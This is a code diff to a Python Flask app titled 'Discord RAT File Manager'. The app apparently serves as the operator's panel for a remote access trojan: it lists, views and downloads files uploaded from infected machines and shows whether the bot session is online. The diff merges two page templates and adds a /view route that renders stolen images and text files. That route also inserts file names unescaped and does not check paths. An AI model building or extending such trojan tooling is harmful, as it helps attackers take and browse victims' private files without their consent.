@@ -1,8 +1,5 @@
-from flask import Flask, send_file, request, render_template_string, abort
-import os, shutil, sys
-import traceback
-import threading
-import time
+from flask import Flask, send_file, request, render_template_string
+import os, sys, traceback, threading, time
 
 def get_local_appdata():
     return os.getenv("LOCALAPPDATA")
@@ -14,7 +11,8 @@ UPLOAD_FOLDER = os.path.join(TARGET_DIR, "uploads")
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
 if not os.path.exists(STATE_FILE):
-    with open(STATE_FILE, "w") as f: f.write("running")
+    with open(STATE_FILE, "w") as f:
+        f.write("running")
 
 app = Flask(__name__)
 
@@ -25,7 +23,6 @@ def get_state():
             return content if content else "running"
     except:
         return "running"
-
 
 def shutdown_server():
     func = request.environ.get("werkzeug.server.shutdown")
@@ -49,52 +46,42 @@ def shutdown():
 def home():
     try:
         state = get_state()
-        if state == "supervisor":
-            files = os.listdir(UPLOAD_FOLDER)
-            html = """
-            <html>
-            <head><title>Discord RAT File Manager</title></head>
-            <body style="background:#111; color:#eee; text-align:center; font-family:sans-serif;">
+        files = os.listdir(UPLOAD_FOLDER)
+
+        html = """
+        <html>
+        <head><title>Discord RAT File Manager</title></head>
+        <body style="background:#111; color:#eee; text-align:center; font-family:sans-serif;">
+            {% if state == 'supervisor' %}
                 <h2 style="color:orange;">Supervisor Mode — Bot is currently offline</h2>
-                <hr style="border-color:#333; margin-bottom:20px;">
-                <h1>Remote Files</h1>
-                {% for f in files %}
-                    <div style="margin:10px;">
-                        <span style="color:#4af;">{{ f }}</span>
-                        <a href="/download/{{ f }}" style="color:#aaa; margin-left:15px;">[Download]</a>
-                    </div>
-                {% endfor %}
-                {% if not files %}<p>No files have been uploaded.</p>{% endif %}
-            </body>
-            </html>
-            """
-            return render_template_string(html, files=files)
+            {% else %}
+                <h2 style="color:#4f4;">Bot Online — Active Session Running</h2>
+            {% endif %}
+            <hr style="border-color:#333; margin-bottom:20px;">
+            <h1>Remote Files</h1>
+
+            {% for f in files %}
+                <div style="margin:10px;">
+                    <a href="/view/{{ f }}" style="color:#4af; text-decoration:none; cursor:pointer;">
+                        {{ f }}
+                    </a>
+                    <a href="/download/{{ f }}" style="color:#aaa; margin-left:15px;">[Download]</a>
+                </div>
+            {% endfor %}
+
+            {% if not files %}
+                <p>No files have been uploaded.</p>
+            {% endif %}
+        </body>
+        </html>
+        """
 
         if state == "hardstop":
             shutdown()
             return "Server is shutting down due to Hardstop...", 200
 
-        files = os.listdir(UPLOAD_FOLDER)
-        
-        html = """
-        <html>
-        <head><title>Discord RAT File Manager</title></head>
-        <body style="background:#111; color:#eee; text-align:center; font-family:sans-serif;">
-            <h2 style="color:#4f4;">Bot Online — Active Session Running</h2>
-            <hr style="border-color:#333; margin-bottom:20px;">
-            <h1>Remote Files</h1>
-            {% for f in files %}
-                <div style="margin:10px;">
-                    <span style="color:#4af;">{{ f }}</span>
-                    <a href="/download/{{ f }}" style="color:#aaa; margin-left:15px;">[Download]</a>
-                </div>
-            {% endfor %}
-            {% if not files %}<p>No files have been uploaded.</p>{% endif %}
-        </body>
-        </html>
-        
-        """
-        return render_template_string(html, files=files)
+        return render_template_string(html, files=files, state=state)
+
     except Exception:
         return f"<pre>{traceback.format_exc()}</pre>", 500
 
@@ -116,6 +103,46 @@ def upload_file():
     except Exception as e:
         return f"Upload error: {e}", 500
 
+@app.route("/view/<path:filename>")
+def view_file(filename):
+    try:
+        path = os.path.join(UPLOAD_FOLDER, filename)
+
+        if not os.path.exists(path):
+            return "File not found", 404
+
+        ext = filename.lower().split(".")[-1]
+
+        if ext in ["png", "jpg", "jpeg", "gif", "bmp", "webp"]:
+            return f"""
+            <html>
+            <body style='background:#111; color:#eee; text-align:center;'>
+                <h2>{filename}</h2>
+                <img src="/download/{filename}" style="max-width:90%; border:2px solid #444;">
+            </body>
+            </html>
+            """
+
+        if ext in ["txt", "log", "json", "py", "md", "html", "css", "js", "cfg", "ini"]:
+            with open(path, "r", errors="ignore") as f:
+                content = f.read()
+
+            safe = content.replace("<", "&lt;").replace(">", "&gt;")
+
+            return f"""
+            <html>
+            <body style='background:#111; color:#eee; padding:20px;'>
+                <h2>{filename}</h2>
+                <pre style="white-space:pre-wrap; background:#222; padding:15px; border-radius:8px;">{safe}</pre>
+            </body>
+            </html>
+            """
+
+        return send_file(path, as_attachment=True)
+
+    except Exception as e:
+        return f"Error: {e}", 500
+
 @app.route("/download/<filename>")
 def download_file(filename):
     try:
@@ -127,3 +154,4 @@ if __name__ == "__main__":
     if get_state() == "hardstop":
         sys.exit(0)
     app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
+    
